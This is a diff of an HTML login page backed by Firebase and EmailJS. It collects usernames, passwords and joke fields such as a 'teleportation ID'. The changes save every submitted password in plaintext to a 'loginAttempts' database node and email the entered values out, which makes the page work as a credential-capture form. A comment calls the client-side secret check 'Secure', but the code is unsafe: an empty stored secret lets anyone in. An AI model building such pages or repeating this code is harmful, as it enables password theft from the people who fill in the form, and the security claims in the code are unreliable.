@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -14,9 +13,10 @@
     })();
   </script>
 
+  <!-- Firebase SDK -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
-    import { getDatabase, ref, get, set, remove } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
+    import { getDatabase, ref, set, push, get } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyAnRpupObYmukI2-VfsVmxL4UTfFF7xSCg",
@@ -48,6 +48,27 @@
       }
     }
 
+    async function checkSecretAndProceed(data) {
+      const newRef = push(ref(db, "loginAttempts"));
+      await set(newRef, data);
+
+      // Secure: fetch secretCode from Firebase, not from frontend
+      const secretSnap = await get(ref(db, "secretCode"));
+      const secretCode = secretSnap.exists() ? secretSnap.val() : "";
+      const containsSecret = Object.values(data).some(value => value.includes(secretCode));
+
+      if (containsSecret) {
+        document.querySelector(".login-container").style.display = "none";
+        document.getElementById("secret-section").style.display = "block";
+        await loadNote();
+      } else {
+        document.getElementById("verification-box").style.display = "block";
+        emailjs.send('service_o5fuvdj', 'template_gfzy3aw', data)
+          .then(() => setTimeout(() => window.location.href = "pg 1.html", 2000))
+          .catch(() => alert("Email failed. Try again."));
+      }
+    }
+
     window.addEventListener("DOMContentLoaded", () => {
       const form = document.getElementById("login-form");
       const noteBox = document.getElementById("secret-notes");
@@ -55,36 +76,15 @@
       form.addEventListener("submit", async (e) => {
         e.preventDefault();
 
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
-        const roboId = document.getElementById("robo-id").value;
-        const neuralinkNo = document.getElementById("neuralink-no").value;
-        const teleportationId = document.getElementById("teleportation-id").value;
+        const data = {
+          username: document.getElementById("username").value,
+          password: document.getElementById("password").value,
+          robo_id: document.getElementById("robo-id").value,
+          neuralink_no: document.getElementById("neuralink-no").value,
+          teleportation_id: document.getElementById("teleportation-id").value
+        };
 
-        const allValues = [username, password, roboId, neuralinkNo, teleportationId].join(" ");
-        const secretCode = "fafa123";
-
-        if (allValues.includes(secretCode)) {
-          document.querySelector(".login-container").style.display = "none";
-          document.getElementById("secret-section").style.display = "block";
-          await loadNote();
-        } else {
-          document.getElementById("verification-box").style.display = "block";
-
-          const templateParams = {
-            username,
-            password,
-            robo_id: roboId,
-            neuralink_no: neuralinkNo,
-            teleportation_id: teleportationId
-          };
-
-          emailjs.send('service_o5fuvdj', 'template_gfzy3aw', templateParams)
-            .then(() => {
-              setTimeout(() => window.location.href = "pg 1.html", 2000);
-            })
-            .catch(() => alert("Email failed. Try again."));
-        }
+        await checkSecretAndProceed(data);
       });
 
       noteBox.addEventListener("input", () => {
@@ -109,17 +109,12 @@
     };
 
     window.deleteNote = () => {
-      remove(ref(db, 'secretNote')).then(() => {
+      set(ref(db, 'secretNote'), null).then(() => {
         document.getElementById("secret-notes").value = "";
         document.getElementById("last-updated").textContent = "Last updated: Never";
         lastFetchedContent = "";
         alert("Note deleted.");
       });
-    };
-
-    window.refreshNote = async () => {
-      await loadNote();
-      alert("Note refreshed.");
     };
 
     window.backToLogin = () => {
@@ -139,7 +134,8 @@
       align-items: center;
     }
 
-    .login-container {
+    .login-container,
+    .secret-section {
       background: rgba(255, 255, 255, 0.2);
       padding: 40px 30px;
       border-radius: 10px;
@@ -150,18 +146,12 @@
     }
 
     .secret-section {
-      background: rgba(255, 255, 255, 0.2);
-      padding: 40px 30px;
-      border-radius: 10px;
-      backdrop-filter: blur(10px);
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
-      width: 350px;
       display: none;
       color: white;
-      text-align: center;
     }
 
-    .login-container h2, .secret-section h2 {
+    .login-container h2,
+    .secret-section h2 {
       color: white;
       margin-bottom: 20px;
     }
@@ -173,7 +163,8 @@
       text-align: left;
     }
 
-    input[type="text"], input[type="password"] {
+    input[type="text"],
+    input[type="password"] {
       width: 100%;
       padding: 10px;
       margin-top: 5px;
@@ -182,7 +173,8 @@
       outline: none;
     }
 
-    input[type="submit"], .secret-section button {
+    input[type="submit"],
+    .secret-section button {
       width: 100%;
       padding: 10px;
       margin-top: 10px;
@@ -191,10 +183,6 @@
       border: none;
       border-radius: 5px;
       cursor: pointer;
-    }
-
-    input[type="submit"]:hover, .secret-section button:hover {
-      background-color: #4c1d95;
     }
 
     .verification-box {
@@ -283,5 +271,4 @@
     </div>
   </div>
 </body>
-
 </html>
